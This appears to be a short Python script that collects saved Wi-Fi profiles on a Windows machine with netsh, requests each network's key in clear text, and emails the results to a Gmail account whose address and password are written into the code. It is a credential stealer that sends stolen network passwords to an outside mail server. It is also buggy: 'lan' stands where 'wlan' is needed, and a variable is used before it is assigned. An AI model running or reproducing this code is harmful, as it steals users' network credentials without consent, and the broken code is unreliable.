import subprocess, smtplib,re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()



command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

for network__name in network_names_list:
    command = "netsh lan show profile " + network__name + " key = clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

send_mail("jhnwck70@gmail.com", "abc123abc12", result)